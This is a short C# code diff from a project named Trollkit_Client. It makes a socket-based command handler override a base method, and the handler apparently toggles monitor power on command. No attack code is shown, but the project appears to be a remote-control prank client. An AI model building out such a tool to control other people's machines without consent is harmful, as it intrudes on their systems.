@@ -21,7 +21,7 @@ namespace Trollkit_Client.Modules.CommandHandlers
 		private const int SC_MONITORPOWER = 0xF170;
 		private const int WM_SYSCOMMAND = 0x0112;
 
-		public bool HandleCommand(Socket s, TransferCommandObject obj)
+		public override bool HandleCommand(Socket s, TransferCommandObject obj)
 		{
 			switch (obj.Command)
 			{
